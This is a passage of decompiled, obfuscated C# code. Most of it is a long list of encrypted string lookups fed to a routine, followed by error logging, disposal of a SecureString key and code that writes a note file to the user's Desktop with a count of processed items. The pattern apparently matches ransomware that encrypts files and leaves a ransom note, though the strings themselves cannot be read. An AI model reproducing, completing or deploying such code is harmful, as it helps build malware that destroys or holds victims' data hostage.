				getString_0(107386952),
				getString_0(107386923),
				getString_0(107386918),
				getString_0(107386881),
				getString_0(107386876),
				getString_0(107386871),
				getString_0(107386898),
				getString_0(107386889),
				getString_0(107386844),
				getString_0(107386863),
				getString_0(107386858),
				getString_0(107386853),
				getString_0(107386812),
				getString_0(107386831),
				getString_0(107386826),
				getString_0(107386821),
				getString_0(107386784),
				getString_0(107386779),
				getString_0(107386774),
				getString_0(107386797),
				getString_0(107386752),
				getString_0(107386747),
				getString_0(107386766),
				getString_0(107386761),
				getString_0(107386756),
				getString_0(107386203),
				getString_0(107396090),
				getString_0(107386198),
				getString_0(107386225),
				getString_0(107386220),
				getString_0(107386215),
				getString_0(107386178),
				getString_0(107386173),
				getString_0(107386164),
				getString_0(107386191),
				getString_0(107386186),
				getString_0(107386181),
				getString_0(107386144),
				getString_0(107386139),
				getString_0(107386162),
				getString_0(107386157),
				getString_0(107386152),
				getString_0(107386115),
				getString_0(107386106),
				getString_0(107386101),
				getString_0(107386128),
				getString_0(107386119),
				getString_0(107386082),
				getString_0(107386077),
				getString_0(107386072),
				getString_0(107386095),
				getString_0(107386090),
				getString_0(107386045),
				getString_0(107395260),
				getString_0(107386040),
				getString_0(107386063),
				getString_0(107386058),
				getString_0(107386053),
				getString_0(107395272),
				getString_0(107396176),
				getString_0(107386016),
				getString_0(107386007),
				getString_0(107386034),
				getString_0(107395399),
				getString_0(107386029),
				getString_0(107386024),
				getString_0(107385987),
				getString_0(107385982),
				getString_0(107385977),
				getString_0(107385972),
				getString_0(107385995),
				getString_0(107385990),
				getString_0(107386465),
				getString_0(107386460),
				getString_0(107386483),
				getString_0(107386478),
				getString_0(107386473),
				getString_0(107386468),
				getString_0(107386427),
				getString_0(107386422),
				getString_0(107386449),
				getString_0(107396112),
				getString_0(107386444),
				getString_0(107386403),
				getString_0(107386398),
				getString_0(107386389),
				getString_0(107386416),
				getString_0(107386411),
				getString_0(107386370),
				getString_0(107386365),
				getString_0(107386360),
				getString_0(107386379),
				getString_0(107386374),
				getString_0(107386333),
				getString_0(107386324),
				getString_0(107386347),
				getString_0(107386342),
				getString_0(107386305),
				getString_0(107386300),
				getString_0(107386295),
				getString_0(107386322),
				getString_0(107386317),
				getString_0(107386312),
				getString_0(107386271),
				getString_0(107386262),
				getString_0(107386289),
				getString_0(107386280),
				getString_0(107386239),
				getString_0(107386230),
				getString_0(107386257),
				getString_0(107386252),
				getString_0(107386247),
				getString_0(107396031),
				getString_0(107385698),
				getString_0(107385689),
				getString_0(107385684),
				getString_0(107385711),
				getString_0(107385706),
				getString_0(107385661),
				getString_0(107385656),
				getString_0(107385679),
				getString_0(107385674),
				getString_0(107385633),
				getString_0(107385628),
				getString_0(107385623),
				getString_0(107385650),
				getString_0(107395284),
				getString_0(107385645),
				getString_0(107395192),
				getString_0(107385640),
				getString_0(107385603),
				getString_0(107385598),
				getString_0(107385593),
				getString_0(107385588),
				getString_0(107395957),
				getString_0(107385615),
				getString_0(107385610),
				getString_0(107385565),
				getString_0(107385560),
				getString_0(107385587),
				getString_0(107385582),
				getString_0(107385533),
				getString_0(107385528),
				getString_0(107385547),
				getString_0(107385542),
				getString_0(107385501),
				getString_0(107385496),
				getString_0(107385523),
				getString_0(107385514),
				getString_0(107385509),
				getString_0(107385472),
				getString_0(107385463),
				getString_0(107385490),
				getString_0(107385485),
				getString_0(107385480),
				getString_0(107385951),
				getString_0(107385946),
				getString_0(107385941),
				getString_0(107385968),
				getString_0(107385963),
				getString_0(107385958),
				getString_0(107385921),
				getString_0(107385916),
				getString_0(107385911),
				getString_0(107385938),
				getString_0(107385933),
				getString_0(107385928),
				getString_0(107385891),
				getString_0(107385886),
				getString_0(107385877),
				getString_0(107385896),
				getString_0(107385859),
				getString_0(107385850),
				getString_0(107385873),
				getString_0(107385868),
				getString_0(107385827),
				getString_0(107385818),
				getString_0(107385841),
				getString_0(107385832),
				getString_0(107385791),
				getString_0(107385786),
				getString_0(107385781),
				getString_0(107385808),
				getString_0(107385803),
				getString_0(107385798),
				getString_0(107385761),
				getString_0(107385756),
				getString_0(107385751),
				getString_0(107385778),
				getString_0(107385773),
				getString_0(107385768),
				getString_0(107385731),
				getString_0(107385726),
				getString_0(107385721),
				getString_0(107385716),
				getString_0(107385739),
				getString_0(107385734),
				getString_0(107396068),
				getString_0(107385185),
				getString_0(107385180),
				getString_0(107385195),
				getString_0(107395967),
				getString_0(107385190),
				getString_0(107385153),
				getString_0(107385148),
				getString_0(107385171),
				getString_0(107385166),
				getString_0(107385161),
				getString_0(107395282),
				getString_0(107396142),
				getString_0(107385156),
				getString_0(107385115),
				getString_0(107385138),
				getString_0(107385133),
				getString_0(107385088),
				getString_0(107385083),
				getString_0(107385078),
				getString_0(107385105),
				getString_0(107385100),
				getString_0(107385095),
				getString_0(107385058),
				getString_0(107385053),
				getString_0(107385048),
				getString_0(107385075),
				getString_0(107385066),
				getString_0(107385061),
				getString_0(107385024),
				getString_0(107385019),
				getString_0(107385042),
				getString_0(107385037),
				getString_0(107385032),
				getString_0(107384995),
				getString_0(107384990),
				getString_0(107384985),
				getString_0(107384980),
				getString_0(107385007),
				getString_0(107385002),
				getString_0(107384961),
				getString_0(107384956),
				getString_0(107384951),
				getString_0(107384978),
				getString_0(107384969),
				getString_0(107384964),
				getString_0(107385439),
				getString_0(107385434),
				getString_0(107396107),
				getString_0(107385457),
				getString_0(107385452),
				getString_0(107385447),
				getString_0(107385410),
				getString_0(107385405),
				getString_0(107385400),
				getString_0(107385427),
				getString_0(107385422),
				getString_0(107385417),
				getString_0(107385412),
				getString_0(107385375),
				getString_0(107385370),
				getString_0(107385365),
				getString_0(107385392),
				getString_0(107385383),
				getString_0(107385346),
				getString_0(107395992),
				getString_0(107385341),
				getString_0(107385336),
				getString_0(107385363),
				getString_0(107385358),
				getString_0(107385353),
				getString_0(107385348),
				getString_0(107385311),
				getString_0(107385306),
				getString_0(107385329),
				getString_0(107385324),
				getString_0(107385283),
				getString_0(107385270),
				getString_0(107385297),
				getString_0(107396049),
				getString_0(107385292),
				getString_0(107385287),
				getString_0(107385246),
				getString_0(107385241),
				getString_0(107385236),
				getString_0(107385263),
				getString_0(107385258),
				getString_0(107385253),
				getString_0(107385216),
				getString_0(107385231),
				getString_0(107384674),
				getString_0(107384669),
				getString_0(107384664),
				getString_0(107384691),
				getString_0(107384686),
				getString_0(107384681),
				getString_0(107384676),
				getString_0(107384639),
				getString_0(107384634),
				getString_0(107384629),
				getString_0(107384652),
				getString_0(107395331),
				getString_0(107384647),
				getString_0(107384606),
				getString_0(107384621),
				getString_0(107384576),
				getString_0(107384567),
				getString_0(107384590),
				getString_0(107384581),
				getString_0(107384540),
				getString_0(107384563),
				getString_0(107384554),
				getString_0(107384513),
				getString_0(107384504),
				getString_0(107384527),
				getString_0(107384522),
				getString_0(107384517),
				getString_0(107384480),
				getString_0(107384475),
				getString_0(107395997),
				getString_0(107384470),
				getString_0(107384497),
				getString_0(107384492),
				getString_0(107384487),
				getString_0(107384450),
				getString_0(107384445),
				getString_0(107384440),
				getString_0(107384463),
				getString_0(107396002),
				getString_0(107384458),
				getString_0(107384453),
				getString_0(107395722),
				getString_0(107384928),
				getString_0(107384923),
				getString_0(107384918),
				getString_0(107384945),
				getString_0(107384936),
				getString_0(107384899),
				getString_0(107384894),
				getString_0(107384889),
				getString_0(107384884),
				getString_0(107384911),
				getString_0(107384902),
				getString_0(107384865),
				getString_0(107384860),
				getString_0(107384883),
				getString_0(107384878),
				getString_0(107384869),
				getString_0(107384832),
				getString_0(107384827),
				getString_0(107384822),
				getString_0(107384849),
				getString_0(107384844),
				getString_0(107384799),
				getString_0(107384794),
				getString_0(107384789),
				getString_0(107384816),
				getString_0(107384811),
				getString_0(107384806),
				getString_0(107384769),
				getString_0(107384764),
				getString_0(107384759),
				getString_0(107384786),
				getString_0(107395727),
				getString_0(107384781),
				getString_0(107384776),
				getString_0(107384739),
				getString_0(107384734),
				getString_0(107384725),
				getString_0(107384752),
				getString_0(107384707),
				getString_0(107384698),
				getString_0(107384721),
				getString_0(107384716),
				getString_0(107384163),
				getString_0(107384158),
				getString_0(107384149),
				getString_0(107384176),
				getString_0(107384171),
				getString_0(107384166),
				getString_0(107384129),
				getString_0(107384120),
				getString_0(107384143),
				getString_0(107396171),
				getString_0(107384134),
				getString_0(107384093),
				getString_0(107384112),
				getString_0(107384103),
				getString_0(107384062),
				getString_0(107384081),
				getString_0(107395301),
				getString_0(107384072),
				getString_0(107384031),
				getString_0(107384026),
				getString_0(107384021),
				getString_0(107384048),
				getString_0(107384039),
				getString_0(107383998),
				getString_0(107383993),
				getString_0(107383988),
				getString_0(107384015),
				getString_0(107384010),
				getString_0(107383969),
				getString_0(107383956),
				getString_0(107383979),
				getString_0(107383934),
				getString_0(107383953),
				getString_0(107383944),
				getString_0(107384407),
				getString_0(107384430),
				getString_0(107384421),
				getString_0(107384380),
				getString_0(107384375),
				getString_0(107384402),
				getString_0(107384397),
				getString_0(107384388),
				getString_0(107384351),
				getString_0(107384346),
				getString_0(107384341),
				getString_0(107384368),
				getString_0(107384363),
				getString_0(107384322),
				getString_0(107395979),
				getString_0(107384317),
				getString_0(107384308),
				getString_0(107384335),
				getString_0(107384330),
				getString_0(107384289),
				getString_0(107384280),
				getString_0(107384307),
				getString_0(107384302),
				getString_0(107384293),
				getString_0(107396102),
				getString_0(107384248),
				getString_0(107384275),
				getString_0(107384266),
				getString_0(107384225),
				getString_0(107384220),
				getString_0(107384215),
				getString_0(107384242),
				getString_0(107384237),
				getString_0(107384232),
				getString_0(107384195),
				getString_0(107384190),
				getString_0(107384185),
				getString_0(107384208),
				getString_0(107384203),
				getString_0(107384198),
				getString_0(107383649),
				getString_0(107383640),
				getString_0(107383659),
				getString_0(107383614),
				getString_0(107383605),
				getString_0(107383632),
				getString_0(107383627),
				getString_0(107383622),
				getString_0(107383585),
				getString_0(107383580),
				getString_0(107383575),
				getString_0(107383602),
				getString_0(107383597),
				getString_0(107383592),
				getString_0(107383555),
				getString_0(107383550),
				getString_0(107383541),
				getString_0(107383568),
				getString_0(107383563),
				getString_0(107383558),
				getString_0(107383521),
				getString_0(107383516),
				getString_0(107383511),
				getString_0(107383538),
				getString_0(107383533),
				getString_0(107395671),
				getString_0(107383528),
				getString_0(107383491),
				getString_0(107383486),
				getString_0(107395289),
				getString_0(107383481),
				getString_0(107383476),
				getString_0(107383503),
				getString_0(107383498),
				getString_0(107383457),
				getString_0(107383448),
				getString_0(107383475),
				getString_0(107383470),
				getString_0(107383465),
				getString_0(107383460),
				getString_0(107383423),
				getString_0(107383414),
				getString_0(107383441),
				getString_0(107383436),
				getString_0(107383907),
				getString_0(107383902),
				getString_0(107383897),
				getString_0(107383912),
				getString_0(107383875),
				getString_0(107383870),
				getString_0(107383865),
				getString_0(107383860),
				getString_0(107383887),
				getString_0(107383882),
				getString_0(107383841),
				getString_0(107383836),
				getString_0(107383831),
				getString_0(107383858),
				getString_0(107383853),
				getString_0(107383848),
				getString_0(107383811),
				getString_0(107383806),
				getString_0(107383801),
				getString_0(107383796),
				getString_0(107383823),
				getString_0(107383818),
				getString_0(107383813),
				getString_0(107383776),
				getString_0(107383771),
				getString_0(107383766),
				getString_0(107383793),
				getString_0(107383788),
				getString_0(107383783),
				getString_0(107383746),
				getString_0(107383737),
				getString_0(107396187),
				getString_0(107383732),
				getString_0(107395962),
				getString_0(107383759),
				getString_0(107383750),
				getString_0(107383713),
				getString_0(107383708),
				getString_0(107383703),
				getString_0(107383730),
				getString_0(107383725),
				getString_0(107383720),
				getString_0(107383683),
				getString_0(107383674),
				getString_0(107383669),
				getString_0(107383696),
				getString_0(107383687),
				getString_0(107383126),
				getString_0(107383153),
				getString_0(107383148),
				getString_0(107383143),
				getString_0(107383102),
				getString_0(107383097),
				getString_0(107383116),
				getString_0(107383075),
				getString_0(107383066),
				getString_0(107383061),
				getString_0(107383088),
				getString_0(107383083),
				getString_0(107383078),
				getString_0(107383041),
				getString_0(107383036),
				getString_0(107383059),
				getString_0(107383054),
				getString_0(107383045),
				getString_0(107383008),
				getString_0(107383003),
				getString_0(107382998),
				getString_0(107383025),
				getString_0(107383020),
				getString_0(107383015),
				getString_0(107382978),
				getString_0(107382973),
				getString_0(107382968),
				getString_0(107382995),
				getString_0(107382990),
				getString_0(107382985),
				getString_0(107382980),
				getString_0(107382943),
				getString_0(107382934),
				getString_0(107382961),
				getString_0(107382956),
				getString_0(107382951),
				getString_0(107382914),
				getString_0(107382909),
				getString_0(107382904),
				getString_0(107382931),
				getString_0(107382922),
				getString_0(107382917),
				getString_0(107383388),
				getString_0(107383383),
				getString_0(107383410),
				getString_0(107383405),
				getString_0(107383396),
				getString_0(107383355),
				getString_0(107383350),
				getString_0(107383377),
				getString_0(107383368),
				getString_0(107383331),
				getString_0(107383326),
				getString_0(107383321),
				getString_0(107383316),
				getString_0(107383339),
				getString_0(107395698),
				getString_0(107383334),
				getString_0(107383293),
				getString_0(107383284),
				getString_0(107383311),
				getString_0(107383302),
				getString_0(107383265),
				getString_0(107383256),
				getString_0(107383279),
				getString_0(107383274),
				getString_0(107383269),
				getString_0(107383232),
				getString_0(107383227),
				getString_0(107383222),
				getString_0(107383249),
				getString_0(107383244),
				getString_0(107383239),
				getString_0(107383194),
				getString_0(107383189),
				getString_0(107383212),
				getString_0(107383207),
				getString_0(107383170),
				getString_0(107383161),
				getString_0(107383184),
				getString_0(107383179),
				getString_0(107383174),
				getString_0(107382625),
				getString_0(107382616),
				getString_0(107382643),
				getString_0(107382638),
				getString_0(107382629),
				getString_0(107382584),
				getString_0(107382611),
				getString_0(107382598),
				getString_0(107382561),
				getString_0(107382552),
				getString_0(107382579),
				getString_0(107382574),
				getString_0(107382569),
				getString_0(107382564),
				getString_0(107382523),
				getString_0(107382546),
				getString_0(107382537),
				getString_0(107382492),
				getString_0(107382487),
				getString_0(107382510),
				getString_0(107382505),
				getString_0(107382500),
				getString_0(107382463),
				getString_0(107382454),
				getString_0(107382481),
				getString_0(107382476),
				getString_0(107382435),
				getString_0(107382426),
				getString_0(107382421),
				getString_0(107382440),
				getString_0(107382399),
				getString_0(107382394),
				getString_0(107382389),
				getString_0(107382416),
				getString_0(107382411),
				getString_0(107382406),
				getString_0(107382881),
				getString_0(107382876),
				getString_0(107382871),
				getString_0(107382898),
				getString_0(107382893),
				getString_0(107382848),
				getString_0(107382843),
				getString_0(107382838),
				getString_0(107382865),
				getString_0(107382816),
				getString_0(107382811),
				getString_0(107382806),
				getString_0(107382829),
				getString_0(107382824),
				getString_0(107382787),
				getString_0(107382782),
				getString_0(107382777),
				getString_0(107382772),
				getString_0(107382799),
				getString_0(107382754),
				getString_0(107382745),
				getString_0(107382740),
				getString_0(107382767),
				getString_0(107382762),
				getString_0(107382757),
				getString_0(107382716),
				getString_0(107382739),
				getString_0(107382734),
				getString_0(107382729),
				getString_0(107382688),
				getString_0(107382683),
				getString_0(107382678),
				getString_0(107382705),
				getString_0(107382700),
				getString_0(107382695),
				getString_0(107382658),
				getString_0(107382653),
				getString_0(107382648),
				getString_0(107382671),
				getString_0(107382666),
				getString_0(107382661),
				getString_0(107382112),
				getString_0(107382103),
				getString_0(107382130),
				getString_0(107382121),
				getString_0(107382116),
				getString_0(107382079),
				getString_0(107382070),
				getString_0(107382097),
				getString_0(107382092),
				getString_0(107382087),
				getString_0(107382050),
				getString_0(107382041),
				getString_0(107382064),
				getString_0(107382059),
				getString_0(107382054),
				getString_0(107382017),
				getString_0(107382012),
				getString_0(107382007),
				getString_0(107382030),
				getString_0(107382021),
				getString_0(107381984),
				getString_0(107381979),
				getString_0(107381974),
				getString_0(107382001),
				getString_0(107381996),
				getString_0(107381991),
				getString_0(107381954),
				getString_0(107381949),
				getString_0(107381944),
				getString_0(107381971),
				getString_0(107381962),
				getString_0(107381957),
				getString_0(107381920),
				getString_0(107381915),
				getString_0(107381938),
				getString_0(107381933),
				getString_0(107381928),
				getString_0(107381891),
				getString_0(107381886),
				getString_0(107381881),
				getString_0(107381876),
				getString_0(107381903),
				getString_0(107381898),
				getString_0(107381893),
				getString_0(107382368),
				getString_0(107382363),
				getString_0(107382358),
				getString_0(107382385),
				getString_0(107382376),
				getString_0(107382339),
				getString_0(107382334),
				getString_0(107382329),
				getString_0(107382352),
				getString_0(107382343),
				getString_0(107382306),
				getString_0(107382297),
				getString_0(107396060),
				getString_0(107382320),
				getString_0(107395434),
				getString_0(107395389),
				getString_0(107382311),
				getString_0(107382266),
				getString_0(107382261),
				getString_0(107382288),
				getString_0(107382283),
				getString_0(107382278),
				getString_0(107382237),
				getString_0(107382232),
				getString_0(107382259),
				getString_0(107382254),
				getString_0(107382249),
				getString_0(107382244),
				getString_0(107382207),
				getString_0(107382198),
				getString_0(107382225),
				getString_0(107382220),
				getString_0(107382215),
				getString_0(107382178),
				getString_0(107382173),
				getString_0(107382168),
				getString_0(107382195),
				getString_0(107382190),
				getString_0(107382185),
				getString_0(107382180),
				getString_0(107382143),
				getString_0(107382138),
				getString_0(107382161),
				getString_0(107382152),
				getString_0(107381603),
				getString_0(107381598),
				getString_0(107381593),
				getString_0(107381616),
				getString_0(107381611),
				getString_0(107381606),
				getString_0(107381569),
				getString_0(107381564),
				getString_0(107381587),
				getString_0(107381582),
				getString_0(107395984),
				getString_0(107381573),
				getString_0(107381536),
				getString_0(107381531),
				getString_0(107381526),
				getString_0(107381553),
				getString_0(107381548),
				getString_0(107381543),
				getString_0(107381506),
				getString_0(107381497),
				getString_0(107381520),
				getString_0(107381515),
				getString_0(107381474),
				getString_0(107381469),
				getString_0(107381464),
				getString_0(107381491),
				getString_0(107381486),
				getString_0(107396120),
				getString_0(107381481),
				getString_0(107381476),
				getString_0(107381439),
				getString_0(107396147),
				getString_0(107381430),
				getString_0(107381457),
				getString_0(107381448),
				getString_0(107381411),
				getString_0(107381406),
				getString_0(107381401),
				getString_0(107381396),
				getString_0(107381423),
				getString_0(107381418),
				getString_0(107381413),
				getString_0(107381376),
				getString_0(107381371),
				getString_0(107381366),
				getString_0(107381393),
				getString_0(107381388),
				getString_0(107381383),
				getString_0(107381858),
				getString_0(107381853),
				getString_0(107381848),
				getString_0(107381863),
				getString_0(107381842),
				getString_0(107396132),
				getString_0(107381837),
				getString_0(107381832),
				getString_0(107381787),
				getString_0(107381806),
				getString_0(107381761),
				getString_0(107381756),
				getString_0(107381751),
				getString_0(107381778),
				getString_0(107381773),
				getString_0(107381764),
				getString_0(107381723),
				getString_0(107381718),
				getString_0(107381745),
				getString_0(107381740),
				getString_0(107381735),
				getString_0(107381698),
				getString_0(107381693),
				getString_0(107381684),
				getString_0(107381711),
				getString_0(107381706),
				getString_0(107381661),
				getString_0(107381656),
				getString_0(107381679),
				getString_0(107381634),
				getString_0(107381625),
				getString_0(107381640),
				getString_0(107381083),
				getString_0(107381078),
				getString_0(107381105),
				getString_0(107381100),
				getString_0(107381059),
				getString_0(107381054),
				getString_0(107381049),
				getString_0(107381044),
				getString_0(107381071),
				getString_0(107381062),
				getString_0(107381021),
				getString_0(107381016),
				getString_0(107381043),
				getString_0(107395349),
				getString_0(107381038),
				getString_0(107381033),
				getString_0(107381028),
				getString_0(107380991),
				getString_0(107395311),
				getString_0(107380986),
				getString_0(107380981),
				getString_0(107381008),
				getString_0(107381003),
				getString_0(107380998),
				getString_0(107380961),
				getString_0(107380956),
				getString_0(107380951),
				getString_0(107380978),
				getString_0(107380929),
				getString_0(107380924),
				getString_0(107380919),
				getString_0(107380946),
				getString_0(107380937),
				getString_0(107380896),
				getString_0(107380891),
				getString_0(107380914),
				getString_0(107380909),
				getString_0(107380864),
				getString_0(107380879),
				getString_0(107380874),
				getString_0(107380869),
				getString_0(107381344),
				getString_0(107381335),
				getString_0(107381362),
				getString_0(107381357),
				getString_0(107381312),
				getString_0(107381303),
				getString_0(107381330),
				getString_0(107381325),
				getString_0(107381320),
				getString_0(107381279),
				getString_0(107381274),
				getString_0(107381297),
				getString_0(107381288),
				getString_0(107381251),
				getString_0(107381246),
				getString_0(107381241),
				getString_0(107381264),
				getString_0(107381255),
				getString_0(107381218),
				getString_0(107381213),
				getString_0(107381208),
				getString_0(107381235),
				getString_0(107381230),
				getString_0(107381225),
				getString_0(107395751),
				getString_0(107381220),
				getString_0(107381179),
				getString_0(107381174),
				getString_0(107381201),
				getString_0(107381196),
				getString_0(107381191),
				getString_0(107381154),
				getString_0(107381149),
				getString_0(107381144),
				getString_0(107381171),
				getString_0(107381162),
				getString_0(107381157),
				getString_0(107381120),
				getString_0(107381115),
				getString_0(107381138),
				getString_0(107381133),
				getString_0(107381128),
				getString_0(107413339),
				getString_0(107413334),
				getString_0(107413361),
				getString_0(107413356),
				getString_0(107413351),
				getString_0(107413314),
				getString_0(107413309),
				getString_0(107413300),
				getString_0(107413327),
				getString_0(107413318),
				getString_0(107413281),
				getString_0(107413296),
				getString_0(107413291),
				getString_0(107413286),
				getString_0(107413249),
				getString_0(107413244),
				getString_0(107413239),
				getString_0(107413266),
				getString_0(107413261),
				getString_0(107413256),
				getString_0(107413219),
				getString_0(107413214),
				getString_0(107413205),
				getString_0(107413232),
				getString_0(107413227),
				getString_0(107413222),
				getString_0(107413185),
				getString_0(107413180),
				getString_0(107413175),
				getString_0(107413202),
				getString_0(107413197),
				getString_0(107413192),
				getString_0(107413155),
				getString_0(107413150),
				getString_0(107413145),
				getString_0(107413168),
				getString_0(107413159),
				getString_0(107413122),
				getString_0(107413117),
				getString_0(107413108),
				getString_0(107413135),
				getString_0(107413130),
				getString_0(107413601),
				getString_0(107413596),
				getString_0(107413591),
				getString_0(107413618),
				getString_0(107395416),
				getString_0(107413613),
				getString_0(107413608),
				getString_0(107413567),
				getString_0(107413562),
				getString_0(107413557),
				getString_0(107413584),
				getString_0(107413575),
				getString_0(107413538),
				getString_0(107413529),
				getString_0(107413552),
				getString_0(107413547),
				getString_0(107413542),
				getString_0(107413505),
				getString_0(107395425),
				getString_0(107413496),
				getString_0(107413523),
				getString_0(107413518),
				getString_0(107413513),
				getString_0(107413472),
				getString_0(107395974),
				getString_0(107413467),
				getString_0(107413490),
				getString_0(107413485),
				getString_0(107413440),
				getString_0(107413435),
				getString_0(107413430),
				getString_0(107413457),
				getString_0(107413452),
				getString_0(107413411),
				getString_0(107396004),
				getString_0(107413406),
				getString_0(107413397),
				getString_0(107413424),
				getString_0(107413419),
				getString_0(107413374),
				getString_0(107413369),
				getString_0(107413392),
				getString_0(107413387),
				getString_0(107412830),
				getString_0(107412825),
				getString_0(107412820),
				getString_0(107412847),
				getString_0(107412842),
				getString_0(107412837),
				getString_0(107412800),
				getString_0(107412795),
				getString_0(107412790),
				getString_0(107412817),
				getString_0(107412812),
				getString_0(107412807),
				getString_0(107412770),
				getString_0(107412761),
				getString_0(107412756),
				getString_0(107412779),
				getString_0(107412738),
				getString_0(107412733),
				getString_0(107412728),
				getString_0(107412751),
				getString_0(107412742),
				getString_0(107395277),
				getString_0(107412705),
				getString_0(107412696),
				getString_0(107412723),
				getString_0(107412718),
				getString_0(107412713),
				getString_0(107412708),
				getString_0(107412671),
				getString_0(107412666),
				getString_0(107412689),
				getString_0(107412684),
				getString_0(107412679),
				getString_0(107412642),
				getString_0(107412637),
				getString_0(107412632),
				getString_0(107412655),
				getString_0(107412650),
				getString_0(107412645),
				getString_0(107412608),
				getString_0(107412599),
				getString_0(107412622),
				getString_0(107412617),
				getString_0(107412612),
				getString_0(107413083),
				getString_0(107413106),
				getString_0(107413101),
				getString_0(107413092),
				getString_0(107413047),
				getString_0(107413074),
				getString_0(107413065),
				getString_0(107413060),
				getString_0(107413023),
				getString_0(107413018),
				getString_0(107413013),
				getString_0(107413040),
				getString_0(107413035),
				getString_0(107413030),
				getString_0(107412993),
				getString_0(107412988),
				getString_0(107412983),
				getString_0(107413010),
				getString_0(107413005),
				getString_0(107413000),
				getString_0(107412963),
				getString_0(107412954),
				getString_0(107412949),
				getString_0(107412976),
				getString_0(107412971),
				getString_0(107412930),
				getString_0(107412925),
				getString_0(107412916),
				getString_0(107412943),
				getString_0(107412938),
				getString_0(107412897),
				getString_0(107412888),
				getString_0(107412915),
				getString_0(107412910),
				getString_0(107412905),
				getString_0(107412900),
				getString_0(107412863),
				getString_0(107412854),
				getString_0(107412877),
				getString_0(107412320),
				getString_0(107412339),
				getString_0(107412334),
				getString_0(107412329),
				getString_0(107412288),
				getString_0(107412283),
				getString_0(107412306),
				getString_0(107412301),
				getString_0(107412296),
				getString_0(107412259),
				getString_0(107412250),
				getString_0(107412245),
				getString_0(107412268),
				getString_0(107412227),
				getString_0(107412218),
				getString_0(107412241),
				getString_0(107412236),
				getString_0(107412231),
				getString_0(107412194),
				getString_0(107412189),
				getString_0(107412180),
				getString_0(107412207),
				getString_0(107412202),
				getString_0(107412197),
				getString_0(107412160),
				getString_0(107412155),
				getString_0(107412150),
				getString_0(107412173),
				getString_0(107412168),
				getString_0(107412131),
				getString_0(107412126),
				getString_0(107412121),
				getString_0(107412116),
				getString_0(107412143),
				getString_0(107412138),
				getString_0(107412133),
				getString_0(107412096),
				getString_0(107412091),
				getString_0(107412086),
				getString_0(107412113),
				getString_0(107412104),
				getString_0(107412579),
				getString_0(107412574),
				getString_0(107412565),
				getString_0(107412592),
				getString_0(107412587),
				getString_0(107412582),
				getString_0(107412545),
				getString_0(107412540),
				getString_0(107412535),
				getString_0(107412558),
				getString_0(107412553),
				getString_0(107412548),
				getString_0(107412511),
				getString_0(107412506),
				getString_0(107412529),
				getString_0(107412524),
				getString_0(107412519),
				getString_0(107412482),
				getString_0(107412477),
				getString_0(107412472),
				getString_0(107412499),
				getString_0(107412494),
				getString_0(107412489),
				getString_0(107412448),
				getString_0(107412443),
				getString_0(107412438),
				getString_0(107412465),
				getString_0(107412456),
				getString_0(107412419),
				getString_0(107412414),
				getString_0(107412409),
				getString_0(107412404),
				getString_0(107412431),
				getString_0(107395255),
				getString_0(107412422),
				getString_0(107412385),
				getString_0(107412380),
				getString_0(107412403),
				getString_0(107412398),
				getString_0(107412393),
				getString_0(107412388),
				getString_0(107412351),
				getString_0(107412346),
				getString_0(107412341),
				getString_0(107412364),
				getString_0(107412359),
				getString_0(107411806),
				getString_0(107411797),
				getString_0(107411824),
				getString_0(107411819),
				getString_0(107411814),
				getString_0(107411777),
				getString_0(107411772),
				getString_0(107411767),
				getString_0(107411790),
				getString_0(107411785),
				getString_0(107411780),
				getString_0(107411743),
				getString_0(107411738),
				getString_0(107411761),
				getString_0(107411752),
				getString_0(107411715),
				getString_0(107411710),
				getString_0(107411705),
				getString_0(107411728),
				getString_0(107396154),
				getString_0(107411723),
				getString_0(107411682),
				getString_0(107411673),
				getString_0(107411692),
				getString_0(107395340),
				getString_0(107411651),
				getString_0(107396163),
				getString_0(107411642),
				getString_0(107411665),
				getString_0(107411660),
				getString_0(107411615),
				getString_0(107411606),
				getString_0(107411629),
				getString_0(107411624),
				getString_0(107411587),
				getString_0(107411578),
				getString_0(107411573),
				getString_0(107411596),
				getString_0(107411591),
				getString_0(107412062),
				getString_0(107412057),
				getString_0(107412052),
				getString_0(107412079),
				getString_0(107412034),
				getString_0(107412025),
				getString_0(107412020),
				getString_0(107412047),
				getString_0(107412042),
				getString_0(107412037),
				getString_0(107411996),
				getString_0(107411991),
				getString_0(107412014),
				getString_0(107412009),
				getString_0(107412004),
				getString_0(107411967),
				getString_0(107411958),
				getString_0(107411985),
				getString_0(107411980),
				getString_0(107411939),
				getString_0(107411934),
				getString_0(107411925),
				getString_0(107411948),
				getString_0(107411943),
				getString_0(107411906),
				getString_0(107411897),
				getString_0(107411920),
				getString_0(107411911),
				getString_0(107411874),
				getString_0(107411869),
				getString_0(107411864),
				getString_0(107411891),
				getString_0(107411882),
				getString_0(107411877),
				getString_0(107411840),
				getString_0(107411859),
				getString_0(107411846),
				getString_0(107411289),
				getString_0(107411308),
				getString_0(107411303),
				getString_0(107411266),
				getString_0(107411261),
				getString_0(107411256),
				getString_0(107411283),
				getString_0(107411278),
				getString_0(107411269),
				getString_0(107411232),
				getString_0(107411227),
				getString_0(107411250),
				getString_0(107411241),
				getString_0(107411236),
				getString_0(107411199),
				getString_0(107411194),
				getString_0(107411189),
				getString_0(107411216),
				getString_0(107411211),
				getString_0(107396182),
				getString_0(107411206),
				getString_0(107411165),
				getString_0(107411160),
				getString_0(107411187),
				getString_0(107411178),
				getString_0(107411133),
				getString_0(107411128),
				getString_0(107411155),
				getString_0(107411150),
				getString_0(107411145),
				getString_0(107411140),
				getString_0(107411103)
			}, new string[0], ptBQsjxXVIiCd, getString_0(107411094));
		}
		catch (Exception ex15)
		{
			if (LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(KymHhFbNcwDYA, getString_0(107411113) + ex15.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088));
				streamWriter.WriteLine(UwCpksGCJZfb(getString_0(107411559)));
				streamWriter.WriteLine(getString_0(107396509));
				streamWriter.WriteLine(UwCpksGCJZfb(getString_0(107409145)));
				streamWriter.WriteLine(QGCgJoxiimxbWS);
				if (ABcQQsWptXmkku == getString_0(107396999))
				{
					streamWriter.WriteLine(getString_0(107396509));
					streamWriter.WriteLine(UwCpksGCJZfb(getString_0(107409112)) + Convert.ToString(usKuKFlfRGo.Count));
				}
				if (rCIcEDqTdpw)
				{
